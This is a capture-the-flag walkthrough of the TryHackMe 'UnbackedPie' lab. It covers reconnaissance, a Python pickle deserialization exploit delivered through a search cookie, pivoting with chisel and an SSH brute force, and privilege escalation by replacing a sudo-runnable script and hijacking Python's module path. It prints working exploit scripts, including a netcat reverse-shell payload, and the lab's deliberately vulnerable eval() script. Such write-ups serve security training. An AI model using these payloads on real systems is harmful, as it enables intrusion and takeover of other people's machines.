### UnbackedPie TryHackMe

### Difficulty = Medium

Nmap Scan:
![image](https://user-images.githubusercontent.com/113513376/217822200-0eb47c29-3d76-4a0b-a91e-67823ceaadde.png)

```
# Nmap 7.92 scan initiated Sat Jan  7 04:17:47 2023 as: nmap -sCV -p 5003 -oN nmapscan -Pn 10.10.10.82
Nmap scan report for 10.10.10.82
Host is up (0.17s latency).

PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 07 Jan 2023 03:17:54 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=54Ujr9NU5L86w9hShEChqIAlsZCoJBLfgBTxz7gYM1G7mS92Q4OX65hCB31xitni; expires=Sat, 06 Jan 2024 03:17:54 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 07 Jan 2023 03:17:55 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=FMOXTiI41MdRPJ8TtubJzr01YLpaXXzJCzRYMdwruz4DpMKympew4W9Dk0QEqMq1; expires=Sat, 06 Jan 2024 03:17:55 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5003-TCP:V=7.92%I=7%D=1/7%Time=63B8E462%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2007\x20Jan\x202
SF:023\x2003:17:54\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.6
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2
SF:0DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:\x2
SF:0\x20csrftoken=54Ujr9NU5L86w9hShEChqIAlsZCoJBLfgBTxz7gYM1G7mS92Q4OX65hC
SF:B31xitni;\x20expires=Sat,\x2006\x20Jan\x202024\x2003:17:54\x20GMT;\x20M
SF:ax-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20html>
SF:\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-8\"
SF:>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"des
SF:cription\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20conten
SF:t=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20<!-
SF:-\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/static/v
SF:endor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n\x2
SF:0\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20\x2
SF:0<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs")%r(H
SF:TTPOptions,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2007\x20Jan\x
SF:202023\x2003:17:55\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8
SF:\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:
SF:\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:
SF:\x20\x20csrftoken=FMOXTiI41MdRPJ8TtubJzr01YLpaXXzJCzRYMdwruz4DpMKympew4
SF:W9Dk0QEqMq1;\x20expires=Sat,\x2006\x20Jan\x202024\x2003:17:55\x20GMT;\x
SF:20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-
SF:8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"
SF:description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20con
SF:tent=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20
SF:<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/stati
SF:c/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n
SF:\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20
SF:\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  7 04:19:22 2023 -- 1 IP address (1 host up) scanned in 95.23 seconds
```

From the scan we can tell its a linux box. And from looking at the result nmap fingerprinted on the web service running we see its using python as its server.

Now i'll check out what the site is all about.
![image](https://user-images.githubusercontent.com/113513376/217816207-814800d4-706a-4ea2-96df-a66ae745c700.png)
![image](https://user-images.githubusercontent.com/113513376/217816234-cb40851e-ee05-4237-8479-9bc55d43fcc9.png)

We see its more of a site that shares various recipes. 

On looking at the top of the page we see that there's a search bar, a login form and a signup form.

I'll check out the search function first and i'll be intercepting the request using burp suite.
![image](https://user-images.githubusercontent.com/113513376/217816340-b6eab476-0011-4808-bb30-3009c8e4085e.png)

We just see that its like a normal search post request which includes a csrf token and the search query. With this i want to know what the response to the server will be.
![image](https://user-images.githubusercontent.com/113513376/217816439-f1a50b41-199d-44c8-a353-847f9c37d129.png)
![image](https://user-images.githubusercontent.com/113513376/217816461-1ae9c71d-7387-4b37-be45-b748b564ca09.png)

Hmmmm, we see that it sets a new cookie called search_cookie and gives it a value. I'll decode the value to see what the encoded string means.
![image](https://user-images.githubusercontent.com/113513376/217816709-ea7cab81-8964-4f18-b2e5-612eb48a9671.png)

On decoding it we see that it does contain the string we searched for which was lol, it then converted it to an object for the web server to understand and from this theory what we can assume that what is happening here is that its serializing the search query content and encoding it in base64. 

Now lets confirm it by decoding it using python with pickle and base64 library.
![image](https://user-images.githubusercontent.com/113513376/217816822-95158d53-c8df-4efd-b2bc-b39a31a6412b.png)

And from the result we can tell it is indeed performing serialization on the content of the search query.

Now from the web post request we see that the search value is then set as a cookie which has a name search_cookie. 

So now we want to perform deserialization attack we can leverage this instead of intercepting each request and forwarding it we will send this to repeater.
![image](https://user-images.githubusercontent.com/113513376/217816914-222fb7e7-660e-4a9b-ba46-440bb569f05a.png)

Now the next thing i did was to make a python script to perfrom a deserialization attack in which the web server will deserialize the malicious content given then run it.

![image](https://user-images.githubusercontent.com/113513376/217817145-2698891e-783f-482a-baaf-64cae35bb055.png)

```
import pickle
import os
import base64
#@author: Hack.You

class exploit:
	def __reduce__(self):
		cmd = ('ping -c 2 10.14.33.50')
		return os.system, (cmd,)

exploit_code = exploit()
serialized = pickle.dumps(exploit_code)
encode = base64.b64encode(serialized)
print(encode)
```

So what this script does is that it imports the necessary requirement needed to perform the deserialization, makes a class which uses the pickle __reduce__  method of pickling then defines a variable which holds the command to be ran, after that it calls the class function and dumps the object value which is later then encoded in base64 and printed out.

Now since the command i used is to ping our hosts, we would want to confirm that it is indeed performing the ping request, i then set up tcpdump which will listen for icmp packets getting to our hosts.

So lets run the command and see if it works.
![image](https://user-images.githubusercontent.com/113513376/217817335-0540a2aa-ec59-4b14-8ad6-859900e707d2.png)

Now replacing the newly created base64 payload in the search_cookie parameter value.
![image](https://user-images.githubusercontent.com/113513376/217817417-6a392169-db64-4b1f-a9d1-a32bc378243d.png)

After sending the request. I get call back from our tcpdump listener.
![image](https://user-images.githubusercontent.com/113513376/217817494-9d86d2e9-46bd-41d5-93fa-3d42d969c59b.png)

Now lets get a reverse shell with this vulnerability. So i edited the code to run the command of a bash reverse shell.
![image](https://user-images.githubusercontent.com/113513376/217817554-851c0f14-465c-4f8c-ba0b-83e66d491db6.png)
![image](https://user-images.githubusercontent.com/113513376/217817877-319ac49a-d97b-4583-9f9d-38f3fc97796c.png)
![image](https://user-images.githubusercontent.com/113513376/217817954-451880ec-5722-4176-a0cd-5179eab1ed13.png)


```
import pickle
import os
import base64
#@author: Hack.You

class exploit:
	def __reduce__(self):
		cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.33.50 46074 >/tmp/f')
		return os.system, (cmd,)

exploit_code = exploit()
serialized = pickle.dumps(exploit_code)
encode = base64.b64encode(serialized)
print(encode)
```

On sending the request again, I get a call back from our listener.
![image](https://user-images.githubusercontent.com/113513376/217818071-30d202c7-88de-4c2d-90b5-0c9f301277fe.png)

From the result we see that this is a container cause the hostname is weird but we can also confirm it by checking the /.dockerenv file or the groups file anyone works.

Anyways lets move on.

On checking the root directory we see that there's a .bash_history file in it.
![image](https://user-images.githubusercontent.com/113513376/217818272-57aaa1d5-9a85-49c6-81bb-a81534450b3a.png)

Viewing the content of this file shows this.
![image](https://user-images.githubusercontent.com/113513376/217818369-74b61ca7-5a5f-4f07-8c5c-ad24829db836.png)

Checking the file we see that the root user in the docker container tried to ssh to another subnet on the box. So I'll just perform the same step.

The problem is that there's no ssh on this docker container.

![image](https://user-images.githubusercontent.com/113513376/217818501-7e1f3e87-0320-4fa4-9f67-e958f15bb10e.png)

To move over this we are going to have to port forward the internal subnet ssh over to our localhost and i'll be using chisel to perform this.

On our attacking host we run this command.
![image](https://user-images.githubusercontent.com/113513376/217818676-d8911c50-a365-4b54-9243-b7abe296cb2b.png)

While on the target host we run this.
![image](https://user-images.githubusercontent.com/113513376/217818786-e51fde63-4cd9-4cbb-ac49-9c5ec5e97c01.png)

We can see that its connected but now lets confirm it.
![image](https://user-images.githubusercontent.com/113513376/217818821-27c81c12-54bb-4a75-9589-6e3a55f57f9a.png)
![image](https://user-images.githubusercontent.com/113513376/217818898-447b7f73-cab7-4406-b425-1ae9c721850c.png)

I port forwarded it successfully and i'll like to ssh with the user ramsey. But just one problem I don't know his password.

So the next thing i did was to brute force ssh using hydra and after few seconds we get a password match.
![image](https://user-images.githubusercontent.com/113513376/217819080-d02964d2-28fb-4ce6-a7ac-758f045c79ff.png)

Now lets login via ssh. And now we're in.

![image](https://user-images.githubusercontent.com/113513376/217819357-806b38c0-2e1c-4c40-ba8e-43abdab6dfff.png)

Lets escalate our privilege 🤓

On doing sudo -l we see that the user can run a python script as user oliver.
![image](https://user-images.githubusercontent.com/113513376/217819468-1565dc77-7827-4565-95b6-b3b5f9b56f08.png)

Now lets check the content of this script. I had to transfer it over to my machine to view it properly.
![image](https://user-images.githubusercontent.com/113513376/217819561-35c2a735-0722-48c8-b78e-bab0aa69f907.png)
![image](https://user-images.githubusercontent.com/113513376/217819604-073a200c-015b-4e75-97b5-d40bbf9cc7b3.png)

```
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
	banner = '''\033[33m                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
    	return banner

#Function Instructions
def instructions():
	print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
	print "\t\t\t","1. Calculator"
	print "\t\t\t","2. Easy Calculator"
	print "\t\t\t","3. Credits"
	print "\t\t\t","4. Exit"
	print "\t\t\t",28 * "-"

def instructions2():
	print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
	print "\t\t\t","1. Add"
	print "\t\t\t","2. Subtract"
	print "\t\t\t","3. Multiply"
	print "\t\t\t","4. Divide"
	print "\t\t\t","5. Back"
	print "\t\t\t",28 * "-"
	
def credits():
	print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"
	
# Function Arithmetic

# Function to add two numbers  
def add(num1, num2): 
    return num1 + num2 
  
# Function to subtract two numbers  
def subtract(num1, num2): 
    return num1 - num2 
  
# Function to multiply two numbers 
def multiply(num1, num2): 
    return num1 * num2 
  
# Function to divide two numbers 
def divide(num1, num2): 
    return num1 / num2 
# Main    	
if __name__ == "__main__":
	print header()
	
	#Variables
	OPTIONS = 0
	OPTIONS2 = 0
	TOTAL = 0
	NUM1 = 0
	NUM2 = 0

	while(OPTIONS != 4):
		instructions()
		OPTIONS = int(input("\t\t\tEnter Options >> "))
	        print "\033c"
		if OPTIONS == 1:
			instructions2()
			OPTIONS2 = int(input("\t\t\tEnter Options >> "))
			print "\033c"
			if OPTIONS2 == 5:
				continue
			else:
				NUM1 = int(input("\t\t\tEnter Number1 >> "))
				NUM2 = int(input("\t\t\tEnter Number2 >> "))
				if OPTIONS2 == 1:
					TOTAL = add(NUM1,NUM2)
				if OPTIONS2 == 2:
					TOTAL = subtract(NUM1,NUM2)
				if OPTIONS2 == 3:
					TOTAL = multiply(NUM1,NUM2)
				if OPTIONS2 == 4:
					TOTAL = divide(NUM1,NUM2)
				print "\t\t\tTotal >> $",TOTAL
		if OPTIONS == 2:
			animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

			print "\r\t\t\t     Waiting to extract..."
			for i in range(len(animation)):
			    time.sleep(0.5)
			    sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
			    sys.stdout.flush()

			LISTED = pytesseract.image_to_string(Image.open('payload.png')) 

			TOTAL = eval(LISTED)
			print "\n\n\t\t\tTotal >> $",TOTAL
		if OPTIONS == 3:
			credits()
	sys.exit(-1)
	
```
  
Well this is quite a lot of code which probably has to deal with exploiting a vulnerability which lays in the code, but since i can't figure my way out in this code I used another way xD

On checking the owners of the vuln.py file we see that we have access over this file which means that we can edit it also.
![image](https://user-images.githubusercontent.com/113513376/217819936-93075689-2b25-45da-bd71-bee64272f839.png)

What i did was to replace the real file to another one and make a code which will grant me shell which of cause i replaced back to the vuln.py file. (P.S: I imported time just for fancy and didn't really call it in the code forgive my noob coding 😂)
![image](https://user-images.githubusercontent.com/113513376/217820025-7122a342-539c-4cdc-bc37-093f08749144.png)

Now lets check the sudo perm we've got over this file and run it.
![image](https://user-images.githubusercontent.com/113513376/217820413-a9153fd2-249c-4d04-9eab-22097d7c6019.png)

Now that we are oliver lets further escalate our privilege.

On checking the sudo permission this user have we see that it can run as root over a script located in the /opt directory another thing that caught my attention is the SETENV permission given also.

What the SETENV basically does is that it allows a user to specify the path where the modules being called in a script is found.
![image](https://user-images.githubusercontent.com/113513376/217820679-810b0702-58b5-4e9a-9886-b985bf87f3c7.png)

Lets see the content of the script the user can run as root.
![image](https://user-images.githubusercontent.com/113513376/217820722-03344e0a-5f8f-4186-b9d7-e0be082b6c2a.png)

So after reading this blog post i was able to understand how we can leverage this permission and exploit it.
![image](https://user-images.githubusercontent.com/113513376/217820782-885c4e7e-6c0e-4ff8-a723-c16848ddabdc.png)
![image](https://user-images.githubusercontent.com/113513376/217820806-9845d34d-9903-43c5-97ab-dcc9653d19de.png)

And now from the content of the /opt/dockerScript.py file, we can see that it imports docker library then runs the code.
![image](https://user-images.githubusercontent.com/113513376/217820926-658ce68b-7b30-43e5-b974-52433c30e29b.png)

To leverage this, I'll make a docker.py file which has the content that will rather grant us a bash shell.

Then specify the path the dockerScript to take is the path we made our own docker.py file which in this case i did it in the users directory
![image](https://user-images.githubusercontent.com/113513376/217821424-bf06a163-50e9-4fb7-ac37-114d044e21e7.png)

Then running the command and specifying the path for the modules to be imported we have a root shell.
![image](https://user-images.githubusercontent.com/113513376/217821491-0ce4efbd-04b0-468a-8397-f0555a1119b2.png)

And we're done

<br> <br>
[Back To Home](../../index.md)




